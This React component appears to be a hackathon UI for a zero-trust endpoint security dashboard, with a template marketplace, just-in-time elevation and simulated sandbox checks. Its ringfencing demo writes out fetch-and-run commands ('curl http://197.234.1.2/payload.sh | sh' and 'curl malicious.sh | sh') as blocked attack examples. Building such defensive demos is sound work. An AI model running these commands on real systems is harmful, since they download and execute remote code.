import React, { useState } from 'react';
import { useApp } from '../../context/AppContext';
import { CommunityTemplate, OperationalMode } from '../../types';
import {
  Zap,
  Star,
  Download,
  ShieldCheck,
  CheckCircle2,
  Terminal,
  Cpu,
  Layers,
  Heart,
  PlusCircle,
  Clock,
  KeyRound,
  Play,
  ShieldAlert,
  AlertTriangle,
  Lock,
  Boxes,
  ArrowRight,
  Sparkles,
  Search,
  Filter,
} from 'lucide-react';

export const Track2Roadmap: React.FC = () => {
  const {
    communityTemplates,
    upvoteCommunityTemplate,
    addCustomTemplate,
    selectTemplateById,
    operationalMode,
    setOperationalMode,
    jitRequests,
    requestJitElevation,
    approveJitElevation,
    publishToCommunity,
    setRole,
  } = useApp();

  const [activeSubTab, setActiveSubTab] = useState<'community' | 'advanced' | 'os-map'>('community');
  const [selectedCategory, setSelectedCategory] = useState<string>('All');
  const [searchQuery, setSearchQuery] = useState('');
  const [notificationMsg, setNotificationMsg] = useState<string | null>(null);

  // Publish Modal State
  const [showPublishModal, setShowPublishModal] = useState(false);
  const [pubTitle, setPubTitle] = useState('');
  const [pubAuthor, setPubAuthor] = useState('Kgosi Mogorosi');
  const [pubOrg, setPubOrg] = useState('Ministry of Health / UniPod');
  const [pubCategory, setPubCategory] = useState<CommunityTemplate['category']>('Healthcare');
  const [pubDesc, setPubDesc] = useState('');
  const [pubTags, setPubTags] = useState('zero-trust, linux-ima, botswana');

  // Advanced Capabilities Simulator States
  const [ringfenceSimOutput, setRingfenceSimOutput] = useState<{
    status: 'BLOCKED';
    parent: string;
    child: string;
    reason: string;
  } | null>(null);

  const [sandboxDetonationStatus, setSandboxDetonationStatus] = useState<string | null>(null);

  // JIT Elevation input
  const [jitAppName, setJitAppName] = useState('hospital-pacs-updater.bin');
  const [jitDuration, setJitDuration] = useState(15);
  const [jitReason, setJitReason] = useState('Emergency hotfix for maternal scanner terminal');

  const showToast = (msg: string) => {
    setNotificationMsg(msg);
    setTimeout(() => setNotificationMsg(null), 3000);
  };

  const handleCloneToMatrix = (tmpl: CommunityTemplate) => {
    const customCell = {
      id: `CLONE-${tmpl.matrixTier}-${Date.now().toString().slice(-3)}`,
      row: (parseInt(tmpl.matrixTier[1]) || 3) as any,
      col: tmpl.matrixTier[0] as any,
      name: tmpl.title,
      targetProfile: `Community Import: ${tmpl.organization}`,
      tagline: tmpl.description,
      devices: 'Community Profile Nodes',
      sensitivityLabel: tmpl.category === 'Healthcare' ? 'Critical Regulated Health Records' : 'Confidential Profile',
      allowedApps: ['dhis2-portal', 'openmrs-ehr', 'libreoffice', 'browser-hardened'],
      ringfencing: {
        usbStorage: 'blocked' as const,
        networkEgress: 'strict-whitelist' as const,
        elevationControl: 'polkit-strict' as const,
        memoryProtection: true,
      },
      openSourceStack: {
        binaryEnforcement: 'Linux IMA / AppArmor Community Ruleset',
        networkInspection: 'Suricata 7.0 + OpenSnitch',
        endpointTelemetry: 'Wazuh 4.7 SIEM',
        integrityAudit: 'Velociraptor Digital Artifacts',
      },
      starred: true,
    };

    addCustomTemplate(customCell);
    selectTemplateById(customCell.id);
    showToast(`Cloned "${tmpl.title}" into your active local matrix!`);
  };

  const handlePublishSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const newTmpl: CommunityTemplate = {
      id: `comm-${Date.now().toString().slice(-4)}`,
      title: pubTitle,
      author: pubAuthor,
      organization: pubOrg,
      category: pubCategory,
      matrixTier: 'C3',
      rating: 5.0,
      utilityScore: 94,
      upvotes: 1,
      downloads: 1,
      verified: true,
      description: pubDesc,
      capabilitiesSupported: ['Custom Application Whitelist', 'Parent-Child Ringfencing', 'Storage Boundary'],
      tags: pubTags.split(',').map((t) => t.trim()).filter(Boolean),
      createdAt: 'Just now',
    };
    publishToCommunity(newTmpl);
    setShowPublishModal(false);
    showToast(`Published "${newTmpl.title}" to Instances Community!`);
    setPubTitle('');
    setPubDesc('');
  };

  const handleTestParentChildRingfence = () => {
    setRingfenceSimOutput({
      status: 'BLOCKED',
      parent: 'libreoffice.bin (PID 3410)',
      child: '/bin/bash -c "curl http://197.234.1.2/payload.sh | sh"',
      reason: 'Ringfencing Pro: Office applications are strictly prohibited from spawning command interpreters or network downloaders.',
    });
  };

  const handleTestSandboxDetonation = () => {
    setSandboxDetonationStatus('detonating');
    setTimeout(() => {
      setSandboxDetonationStatus('done');
    }, 1200);
  };

  const filteredTemplates = communityTemplates.filter((tmpl) => {
    const matchCat = selectedCategory === 'All' || tmpl.category === selectedCategory;
    const matchQuery =
      searchQuery === '' ||
      tmpl.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      tmpl.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
      tmpl.organization.toLowerCase().includes(searchQuery.toLowerCase());
    return matchCat && matchQuery;
  });

  return (
    <div className="space-y-8 max-w-7xl mx-auto px-4 py-6">
      {/* Track 2 Hero Banner */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-purple-950/40 via-slate-900 to-cyan-950/30 border border-purple-500/40 shadow-xl space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-purple-400 animate-pulse"></span>
              <span className="text-xs font-mono font-bold px-2.5 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/40">
                TRACK 2 · THE NEXT FRONTIER
              </span>
            </div>
            <h2 className="text-2xl sm:text-3xl font-black text-white mt-1.5">
              Instances Community Hub & Advanced Capabilities
            </h2>
            <p className="text-xs sm:text-sm text-slate-300 max-w-2xl mt-1">
              Taking zero-trust beyond Track 1: a public template marketplace with utility rankings, process parent-child ringfencing, and Just-In-Time (JIT) elevation control.
            </p>
          </div>

          {/* Sub-tab switcher */}
          <div className="flex items-center gap-1.5 p-1 rounded-xl bg-slate-950 border border-slate-800 shrink-0 text-xs font-mono">
            <button
              onClick={() => setActiveSubTab('community')}
              className={`px-3 py-1.5 rounded-lg transition-all ${
                activeSubTab === 'community'
                  ? 'bg-purple-500/20 text-purple-300 font-bold border border-purple-500/40 shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Community Leaderboard
            </button>
            <button
              onClick={() => setActiveSubTab('advanced')}
              className={`px-3 py-1.5 rounded-lg transition-all ${
                activeSubTab === 'advanced'
                  ? 'bg-amber-500/20 text-amber-300 font-bold border border-amber-500/40 shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Advanced Capabilities
            </button>
            <button
              onClick={() => setActiveSubTab('os-map')}
              className={`px-3 py-1.5 rounded-lg transition-all ${
                activeSubTab === 'os-map'
                  ? 'bg-cyan-500/20 text-cyan-300 font-bold border border-cyan-500/40 shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Production OS Map
            </button>
          </div>
        </div>
      </div>

      {notificationMsg && (
        <div className="p-3.5 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-xs font-mono flex items-center gap-2">
          <CheckCircle2 className="w-4 h-4 shrink-0" />
          <span>{notificationMsg}</span>
        </div>
      )}

      {/* SUB-TAB 1: COMMUNITY HUB & LEADERBOARD */}
      {activeSubTab === 'community' && (
        <div className="space-y-6">
          {/* Action Ribbon & Filters */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 bg-slate-900/80 p-4 rounded-2xl border border-slate-800">
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-xs font-mono text-slate-500 flex items-center gap-1.5 mr-1">
                <Filter className="w-3.5 h-3.5" /> Category:
              </span>
              {['All', 'Healthcare', 'Education', 'FinTech', 'Government'].map((cat) => (
                <button
                  key={cat}
                  onClick={() => setSelectedCategory(cat)}
                  className={`px-3 py-1 rounded-lg text-xs font-mono transition-all ${
                    selectedCategory === cat
                      ? 'bg-purple-500/20 text-purple-300 font-bold border border-purple-500/40'
                      : 'bg-slate-950 text-slate-400 border border-slate-800 hover:text-white'
                  }`}
                >
                  {cat}
                </button>
              ))}
            </div>

            <div className="flex items-center gap-2.5">
              <div className="relative">
                <Search className="w-3.5 h-3.5 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  placeholder="Search templates, authors, tags..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-8 pr-3 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-slate-200 outline-none focus:border-purple-500 w-48 sm:w-64"
                />
              </div>

              <button
                onClick={() => setShowPublishModal(true)}
                className="px-4 py-1.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs font-mono flex items-center gap-1.5 transition-all shadow-md shadow-purple-600/30 shrink-0"
              >
                <PlusCircle className="w-4 h-4" />
                <span>Publish Template</span>
              </button>
            </div>
          </div>

          {/* Templates Grid with Utility Ranking */}
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-5">
            {filteredTemplates.map((tmpl, idx) => (
              <div
                key={tmpl.id}
                className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 hover:border-purple-500/50 transition-all flex flex-col justify-between space-y-4 relative group"
              >
                <div>
                  {/* Top Ranking Badge & Score */}
                  <div className="flex items-center justify-between mb-2.5">
                    <div className="flex items-center gap-1.5">
                      <span className="text-xs font-mono font-black px-2 py-0.5 rounded bg-slate-800 text-purple-300 border border-slate-700">
                        #{idx + 1}
                      </span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30">
                        Tier {tmpl.matrixTier}
                      </span>
                    </div>

                    {/* Utility Ranking Badge */}
                    <div className="flex items-center gap-1.5 bg-slate-950 px-2.5 py-1 rounded-lg border border-slate-800">
                      <Sparkles className="w-3.5 h-3.5 text-amber-400" />
                      <span className="text-xs font-mono font-bold text-amber-300">
                        Utility: {tmpl.utilityScore}/100
                      </span>
                    </div>
                  </div>

                  <h3 className="text-base font-bold text-white group-hover:text-purple-300 transition-colors">
                    {tmpl.title}
                  </h3>

                  <p className="text-xs text-slate-400 mt-1.5 font-sans leading-relaxed line-clamp-3">
                    {tmpl.description}
                  </p>

                  {/* Capabilities tags */}
                  <div className="mt-3 pt-3 border-t border-slate-800/80 space-y-2">
                    <span className="text-[10px] font-mono uppercase text-slate-500 block">
                      Enforced Zero-Trust Capabilities:
                    </span>
                    <div className="flex flex-wrap gap-1">
                      {tmpl.capabilitiesSupported.map((cap, cIdx) => (
                        <span
                          key={cIdx}
                          className="px-2 py-0.5 rounded bg-slate-950 text-slate-300 border border-slate-800 text-[10px] font-mono"
                        >
                          {cap}
                        </span>
                      ))}
                    </div>
                  </div>

                  {/* Author & Organization */}
                  <div className="mt-3 pt-2 text-[11px] font-mono text-slate-400 flex items-center justify-between">
                    <div>
                      <p className="text-slate-200 font-bold">{tmpl.author}</p>
                      <p className="text-slate-500 text-[10px]">{tmpl.organization}</p>
                    </div>
                    <span className="text-slate-500 text-[10px]">{tmpl.createdAt}</span>
                  </div>
                </div>

                {/* Footer: Upvote button & Clone to Matrix */}
                <div className="pt-3 border-t border-slate-800/80 flex items-center gap-2">
                  <button
                    onClick={() => upvoteCommunityTemplate(tmpl.id)}
                    className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-rose-500/40 text-rose-300 text-xs font-mono transition-all shrink-0"
                    title="Upvote Template"
                  >
                    <Heart className="w-3.5 h-3.5 fill-rose-500 text-rose-500" />
                    <span>{tmpl.upvotes}</span>
                  </button>

                  <button
                    onClick={() => handleCloneToMatrix(tmpl)}
                    className="flex-1 py-2 px-3 rounded-xl bg-purple-600/30 hover:bg-purple-600 hover:text-white border border-purple-500/40 text-purple-200 text-xs font-mono font-bold flex items-center justify-center gap-1.5 transition-all"
                  >
                    <Download className="w-3.5 h-3.5" />
                    <span>Clone to Local Matrix</span>
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* SUB-TAB 2: ADVANCED THREAT CAPABILITIES (BEYOND TRACK 1) */}
      {activeSubTab === 'advanced' && (
        <div className="space-y-6">
          <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800">
            <span className="text-xs font-mono uppercase text-amber-400 font-bold block">
              Extended Enterprise Zero-Trust Primitives
            </span>
            <p className="text-xs text-slate-300 mt-1">
              Track 2 incorporates advanced security capabilities taking INSTANCES from initial baseline allow-listing to process-aware application boundaries and automated detonation chambers.
            </p>
          </div>

          <div className="grid md:grid-cols-2 gap-6">
            {/* Capability 1: Parent-Child Process Ringfencing */}
            <div className="p-6 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <span className="text-xs font-mono font-bold text-amber-400 flex items-center gap-2">
                  <Lock className="w-4 h-4" /> 1. Parent-Child Process Ringfencing
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-300 border border-amber-500/20">
                  Ringfencing Pro
                </span>
              </div>
              <p className="text-xs text-slate-300 font-sans leading-relaxed">
                Even if an application like LibreOffice or Adobe Acrobat is allow-listed to run, it is prohibited from spawning command interpreters (`powershell.exe`, `/bin/bash`, `cmd.exe`) or accessing unrelated data folders.
              </p>

              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2 text-xs font-mono">
                <span className="text-slate-500 text-[10px] uppercase">Simulate Macro Execution:</span>
                <p className="text-slate-300">Target Parent: <code>libreoffice.bin</code></p>
                <p className="text-rose-400">Attempted Child: <code>/bin/bash -c "curl malicious.sh | sh"</code></p>
                <button
                  onClick={handleTestParentChildRingfence}
                  className="mt-2 w-full py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-amber-300 font-bold text-xs flex items-center justify-center gap-1.5 transition-all border border-slate-700"
                >
                  <Play className="w-3 h-3 fill-amber-300" />
                  <span>Test Process Ringfence Intercept</span>
                </button>
              </div>

              {ringfenceSimOutput && (
                <div className="p-3.5 rounded-xl bg-rose-950/30 border border-rose-500/40 text-xs font-mono space-y-1">
                  <div className="flex items-center gap-2 text-rose-400 font-bold">
                    <ShieldAlert className="w-4 h-4" />
                    <span>VERDICT: PROCESS HOLLOWING BLOCKED</span>
                  </div>
                  <p className="text-slate-300 text-[11px] font-sans pt-1">{ringfenceSimOutput.reason}</p>
                </div>
              )}
            </div>

            {/* Capability 2: Just-in-Time (JIT) Elevation Control */}
            <div className="p-6 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-2">
                  <KeyRound className="w-4 h-4" /> 2. Just-In-Time (JIT) Elevation Control
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 border border-cyan-500/20">
                  Zero Standing Privileges
                </span>
              </div>
              <p className="text-xs text-slate-300 font-sans leading-relaxed">
                Users operate with standard non-root privileges. When a legitimate administrative patch or diagnostic update is required, users request a time-bounded approval token without receiving permanent admin accounts.
              </p>

              {/* Active JIT Queue */}
              <div className="space-y-2 text-xs font-mono">
                {jitRequests.map((req) => (
                  <div key={req.id} className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-1.5">
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300 font-bold">{req.user}</span>
                      <span className={`text-[10px] px-2 py-0.2 rounded ${
                        req.status === 'APPROVED' ? 'bg-emerald-500/20 text-emerald-300' : 'bg-amber-500/20 text-amber-300'
                      }`}>
                        {req.status}
                      </span>
                    </div>
                    <p className="text-slate-400 text-[11px]">App: <code>{req.targetApp}</code> ({req.durationMinutes}m duration)</p>
                    <p className="text-slate-500 text-[10px]">Reason: {req.reason}</p>

                    {req.status === 'PENDING' ? (
                      <button
                        onClick={() => approveJitElevation(req.id)}
                        className="mt-1 w-full py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-xs"
                      >
                        Sign & Issue Time-Bounded Token
                      </button>
                    ) : (
                      <div className="text-[10px] text-emerald-400 pt-1 flex justify-between">
                        <span>Active Token: <code>{req.issuedToken}</code></span>
                        <span>{req.expiresAt}</span>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Capability 3: Unified Operational Mode Switching */}
            <div className="p-6 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <span className="text-xs font-mono font-bold text-emerald-400 flex items-center gap-2">
                  <Layers className="w-4 h-4" /> 3. Operational Mode Switching
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">
                  Fleet Lifecycle
                </span>
              </div>
              <p className="text-xs text-slate-300 font-sans leading-relaxed">
                Switch the operating state across all protected devices from initial onboarding through strict enforcement and emergency maintenance.
              </p>

              <div className="grid grid-cols-3 gap-2 text-xs font-mono text-center">
                {(['learning', 'secured', 'maintenance'] as const).map((mode) => (
                  <button
                    key={mode}
                    onClick={() => setOperationalMode(mode)}
                    className={`p-3 rounded-xl border transition-all ${
                      operationalMode === mode
                        ? mode === 'secured'
                          ? 'bg-emerald-950/40 border-emerald-500 text-emerald-300 font-bold shadow-md'
                          : mode === 'learning'
                          ? 'bg-cyan-950/40 border-cyan-500 text-cyan-300 font-bold'
                          : 'bg-amber-950/40 border-amber-500 text-amber-300 font-bold'
                        : 'bg-slate-950 border-slate-800 text-slate-500 hover:text-slate-300'
                    }`}
                  >
                    <span className="uppercase text-[11px] block">{mode}</span>
                    <span className="text-[9px] text-slate-400 mt-1 block">
                      {mode === 'learning' ? 'Audit & Baseline' : mode === 'secured' ? 'Zero-Trust Enforce' : 'Emergency Override'}
                    </span>
                  </button>
                ))}
              </div>

              <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
                <span className="text-slate-500 text-[10px] uppercase block">Current Active State:</span>
                <span className="text-emerald-400 font-bold uppercase">{operationalMode} MODE</span>
                <p className="text-[11px] text-slate-400 mt-1 font-sans">
                  {operationalMode === 'secured'
                    ? 'Default-Deny active. No unapproved executables, storage mounts, or foreign ports permitted.'
                    : operationalMode === 'learning'
                    ? 'Observing binaries and building baseline profile without blocking actions.'
                    : 'Maintenance mode authorized. Overrides logged with tamper-evident audit stamps.'}
                </p>
              </div>
            </div>

            {/* Capability 4: Testing Sandbox & Detonation Chamber */}
            <div className="p-6 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <span className="text-xs font-mono font-bold text-purple-400 flex items-center gap-2">
                  <Boxes className="w-4 h-4" /> 4. Testing Sandbox & Detonation Chamber
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-500/10 text-purple-300 border border-purple-500/20">
                  MicroVM Isolation
                </span>
              </div>
              <p className="text-xs text-slate-300 font-sans leading-relaxed">
                Before approving a novel clinic or school binary, the platform detonates it inside an isolated, disposable container to observe behavioral API calls and file access.
              </p>

              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2.5 text-xs font-mono">
                <span className="text-slate-500 text-[10px] uppercase">Automated Artifact Inspection:</span>
                <p className="text-slate-300">File: <code>telecom-billing-patch.elf</code> (Unsigned)</p>
                <button
                  onClick={handleTestSandboxDetonation}
                  disabled={sandboxDetonationStatus === 'detonating'}
                  className="w-full py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs flex items-center justify-center gap-1.5 transition-all"
                >
                  {sandboxDetonationStatus === 'detonating' ? (
                    <span>Detonating in Throwaway Container...</span>
                  ) : (
                    <span>Execute Sandbox Detonation Test</span>
                  )}
                </button>
              </div>

              {sandboxDetonationStatus === 'done' && (
                <div className="p-3 rounded-xl bg-purple-950/30 border border-purple-500/40 text-xs font-mono space-y-1">
                  <span className="text-purple-300 font-bold flex items-center gap-1.5">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> Behavioral Analysis Clean
                  </span>
                  <p className="text-slate-400 text-[11px] font-sans">
                    Zero persistence hooks found, zero unauthorized network calls. Ready to approve into Profile B3.
                  </p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* SUB-TAB 3: PRODUCTION OS MAP */}
      {activeSubTab === 'os-map' && (
        <div className="space-y-6">
          <div className="p-5 rounded-2xl bg-gradient-to-r from-purple-950/30 via-slate-900 to-slate-900 border border-purple-500/30">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Layers className="w-4 h-4 text-purple-400" />
              <span>Translating Instances to Native Production Kernels</span>
            </h3>
            <p className="text-xs text-slate-300 mt-1 max-w-3xl leading-relaxed">
              During the hackathon, INSTANCES safely simulates zero-trust events in-browser. In production deployment across Botswana, 
              lightweight native agents translate the JSON protection matrix into native kernel enforcement primitives.
            </p>
          </div>

          <div className="grid md:grid-cols-2 gap-6">
            <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-3">
              <div className="flex items-center justify-between border-b border-slate-800 pb-2.5">
                <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-2">
                  <Cpu className="w-4 h-4" /> Windows 10/11 & Server
                </span>
                <span className="text-[10px] font-mono text-slate-500">Native Windows Subsystem</span>
              </div>
              <ul className="space-y-2 text-xs font-mono text-slate-300">
                <li className="flex justify-between">
                  <span className="text-slate-500">Execution Boundary:</span>
                  <span className="text-slate-200">AppLocker / WDAC (Code Integrity)</span>
                </li>
                <li className="flex justify-between">
                  <span className="text-slate-500">Storage Ringfencing:</span>
                  <span className="text-slate-200">RemovableStorageDevices GPO & Filter Driver</span>
                </li>
                <li className="flex justify-between">
                  <span className="text-slate-500">Telemetry Engine:</span>
                  <span className="text-slate-200">Windows Event Forwarding (WEF) + Sysmon</span>
                </li>
                <li className="flex justify-between">
                  <span className="text-slate-500">Fail-Safe Behavior:</span>
                  <span className="text-amber-400">Audit-only fallback on driver crash</span>
                </li>
              </ul>
            </div>

            <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-3">
              <div className="flex items-center justify-between border-b border-slate-800 pb-2.5">
                <span className="text-xs font-mono font-bold text-emerald-400 flex items-center gap-2">
                  <Terminal className="w-4 h-4" /> Linux (Debian, Ubuntu, RHEL)
                </span>
                <span className="text-[10px] font-mono text-slate-500">Kernel Subsystem</span>
              </div>
              <ul className="space-y-2 text-xs font-mono text-slate-300">
                <li className="flex justify-between">
                  <span className="text-slate-500">Execution Boundary:</span>
                  <span className="text-slate-200">Linux IMA / EVM (Kernel Hash Check)</span>
                </li>
                <li className="flex justify-between">
                  <span className="text-slate-500">Privilege Ringfence:</span>
                  <span className="text-slate-200">AppArmor Profiles + SELinux Policies</span>
                </li>
                <li className="flex justify-between">
                  <span className="text-slate-500">Telemetry Engine:</span>
                  <span className="text-slate-200">auditd + Wazuh Agent + eBPF probes</span>
                </li>
                <li className="flex justify-between">
                  <span className="text-slate-500">Fail-Safe Behavior:</span>
                  <span className="text-emerald-400">Strict deny-by-default on missing hash</span>
                </li>
              </ul>
            </div>
          </div>
        </div>
      )}

      {/* Publish Template Modal */}
      {showPublishModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm overflow-y-auto">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-xl p-6 shadow-2xl space-y-5 my-8">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2 text-purple-400 font-bold font-mono text-sm">
                <PlusCircle className="w-4 h-4" />
                <span>Publish to Instances Community (Track 2)</span>
              </div>
              <button
                onClick={() => setShowPublishModal(false)}
                className="text-slate-400 hover:text-white p-1 rounded-lg bg-slate-800"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handlePublishSubmit} className="space-y-3.5 text-xs font-mono">
              <div>
                <label className="text-slate-300 block mb-1">Template Title</label>
                <input
                  type="text"
                  placeholder="e.g. Kanye Maternal Ultrasound & Health Shield"
                  value={pubTitle}
                  onChange={(e) => setPubTitle(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 outline-none focus:border-purple-500"
                  required
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-slate-300 block mb-1">Author Name</label>
                  <input
                    type="text"
                    value={pubAuthor}
                    onChange={(e) => setPubAuthor(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 outline-none focus:border-purple-500"
                    required
                  />
                </div>

                <div>
                  <label className="text-slate-300 block mb-1">Category</label>
                  <select
                    value={pubCategory}
                    onChange={(e) => setPubCategory(e.target.value as any)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 outline-none focus:border-purple-500"
                  >
                    <option value="Healthcare">Healthcare</option>
                    <option value="Education">Education</option>
                    <option value="FinTech">FinTech</option>
                    <option value="Government">Government</option>
                    <option value="General">General</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="text-slate-300 block mb-1">Organization / Community Affiliation</label>
                <input
                  type="text"
                  value={pubOrg}
                  onChange={(e) => setPubOrg(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 outline-none focus:border-purple-500"
                  required
                />
              </div>

              <div>
                <label className="text-slate-300 block mb-1">Description & Purpose</label>
                <textarea
                  rows={3}
                  placeholder="Describe the zero-trust boundaries and organizational use case..."
                  value={pubDesc}
                  onChange={(e) => setPubDesc(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 outline-none focus:border-purple-500 font-sans text-xs"
                  required
                />
              </div>

              <div>
                <label className="text-slate-300 block mb-1">Tags (Comma-separated)</label>
                <input
                  type="text"
                  value={pubTags}
                  onChange={(e) => setPubTags(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 outline-none focus:border-purple-500"
                />
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  className="w-full py-2.5 px-4 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold font-sans flex items-center justify-center gap-2 transition-all shadow-md shadow-purple-600/30"
                >
                  <Sparkles className="w-4 h-4" />
                  <span>Publish to Community Marketplace</span>
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
